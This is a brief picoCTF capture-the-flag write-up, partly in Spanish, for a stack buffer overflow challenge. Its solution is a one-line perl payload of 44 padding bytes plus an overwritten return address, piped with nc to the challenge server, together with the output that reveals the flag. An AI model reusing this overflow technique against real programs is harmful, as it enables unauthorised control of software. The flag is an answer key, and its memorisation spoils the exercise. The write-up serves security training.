## Descripción 

Control the return address
Additional details will be available after launching your challenge instance.

Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 65441`

## Hints



## Solución
```

kifuel@DESKTOP-3C07MOG:~$ (perl -e 'print "A"x44 . "\xf6\x91\x04\x08";';echo) | nc saturn.picoctf.net 59812
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_9cf083f8}
kifuel@DESKTOP-3C07MOG:~$
```


## Bandera
